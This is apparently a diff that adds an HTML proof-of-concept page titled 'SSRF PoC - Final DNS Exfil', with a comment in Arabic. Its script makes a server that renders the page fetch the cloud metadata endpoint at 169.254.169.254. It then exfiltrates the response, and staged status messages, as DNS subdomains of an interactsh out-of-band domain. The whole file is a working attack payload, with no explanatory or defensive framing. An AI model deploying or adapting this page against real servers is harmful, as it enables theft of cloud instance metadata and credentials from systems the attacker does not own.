@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF PoC - Final DNS Exfil</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // نطاق interactsh الخاص بك
+        const ATTACKER_DOMAIN = "nhuxvcmuoqyycrcxbetorlulfeg7opf2m.oast.fun";
+
+        function exfiltrate(data) {
+            let subdomain = data.replace(/[^a-zA-Z0-9-]/g, '.').substring(0, 60);
+            fetch("http://" + subdomain + "." + ATTACKER_DOMAIN, { mode: 'no-cors' });
+        }
+
+        exfiltrate("Stage1-Code-Loaded-By-Server");
+
+        setTimeout(() => {
+            exfiltrate("Stage2-Attempting-Internal-Fetch");
+            fetch('http://169.254.169.254/latest/meta-data/')
+                .then(response => response.text())
+                .then(data => {
+                    exfiltrate("Stage3-SUCCESS-" + data);
+                })
+                .catch(error => {
+                    exfiltrate("Stage4-FAILED-" + error.toString());
+                });
+        }, 7000);
+    </script>
+</body>
+</html>
